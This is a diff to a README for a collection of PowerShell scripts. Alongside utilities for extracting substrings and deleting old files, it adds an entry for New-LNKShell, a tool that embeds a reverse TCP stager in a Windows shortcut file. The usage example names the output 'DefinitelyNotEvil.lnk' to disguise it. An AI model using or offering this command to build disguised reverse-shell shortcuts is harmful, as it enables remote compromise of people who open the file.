@@ -40,6 +40,13 @@ Returns the text between two strings.
 Get-Substring -Start 'The quick' -End 'lazy dog' -Path C:\StoryAboutAFox.txt
 ```
 
+##New-LNKShell.ps1
+Creates a reverse TCP stager embedded in a LNK file.
+
+```
+New-LNKShell -LHOST 192.168.1.1 -LPORT -1234 -OutPath C:\Path\To\My\Shell -Filename DefinitelyNotEvil.lnk
+```
+
 ##Remove-Files.ps1
 Removes files older than n days. Defaults to C:\Users\<YOU>\Downloads and 30 days
 
